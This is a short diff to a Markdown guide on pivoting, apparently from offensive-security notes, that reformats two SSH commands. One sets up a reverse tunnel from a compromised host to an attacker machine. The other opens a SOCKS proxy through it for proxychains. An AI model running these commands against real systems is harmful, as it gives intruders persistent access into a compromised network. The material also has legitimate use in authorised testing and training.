@@ -18,11 +18,15 @@ then
 
 * On compromised host :
 
-`ssh -f -N -R 2222:127.0.0.1 USER@ATTACKER`
+```text
+ssh -f -N -R 2222:127.0.0.1 b3v1l@MYBOX
+```
 
-* Then, on attacker :
+* Then, on attacker machine:
 
-`ssh -f -N -D 127.0.0.1:1028 -p 2222 user@127.0.0.1`
+```text
+ssh -f -N -D 127.0.0.1:1028 -p 2222 user@127.0.0.1
+```
 
 * Then configure proxychains.conf
 
